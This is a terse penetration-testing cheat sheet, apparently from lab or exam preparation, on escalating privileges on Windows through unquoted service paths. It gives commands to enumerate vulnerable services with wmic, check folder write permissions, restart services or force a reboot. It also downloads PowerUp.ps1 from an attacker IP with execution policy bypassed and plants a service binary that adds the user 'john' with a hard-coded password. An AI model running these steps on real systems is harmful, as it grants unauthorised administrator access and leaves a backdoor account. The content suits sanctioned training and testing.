# Unquoted Service Paths

Look out for sus programs that have spaces in their directory

The terminal looks for the executable is this sequence
```cmd
C:\Program.exe
C:\Program Files\A.exe
C:\Program Files\A Files\B.exe

net stop service
net start service

#only if above is not possible then check for reboot perms
shutdown /r /t 0
```

Checking for write privileges to a folder
```cmd
icacls C:\Users\nur
```

Find possible unquoted service paths
```cmd
wmic service get name,pathname,displayname,startmode |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
(RUN IN CMD ONLY)

#### PowerUp.ps1
```powershell
iwr http://192.168.45.202/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService

# auto exploit creating user john:Password123!
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
